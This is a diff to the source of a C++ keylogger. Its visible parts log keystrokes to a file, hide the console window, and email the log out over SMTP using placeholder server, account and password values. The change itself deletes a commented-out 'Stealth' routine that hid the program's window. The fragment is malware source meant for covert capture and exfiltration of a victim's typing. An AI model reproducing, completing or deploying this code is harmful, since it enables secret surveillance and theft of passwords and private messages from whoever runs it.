@@ -10,7 +10,7 @@ using namespace std;
 
 ofstream logEmail;
 ofstream logHistory;
-//void Stealth();
+
 string translateKey(int keyStroke);
 void logKey(string keyStroke);
 void hideConsole();
@@ -63,15 +63,7 @@ int main()
     Email email("From", "TOname@domain.com", subject, "Body");/*REPLACE with your data From, TOname, subject(optional), Body*/
     email.send("smtp://smtp.domain.com:587", "username", "password", "filename.txt");/*REPLACE with your data domain, username, password, and filename*/
 }
-  
-/*void Stealth()
-{
-    int hide = 0;//this number determines what the window will do when executes. When 0 window is hidden.
-    HWND Stealth;
-    AllocConsole();
-    Stealth = FindWindowA("ConsleWindowClass", NULL);
-    ShowWindow(Stealth, hide);
-}*/
+
 void logKey(string keyStroke)
 {
     logEmail << keyStroke;
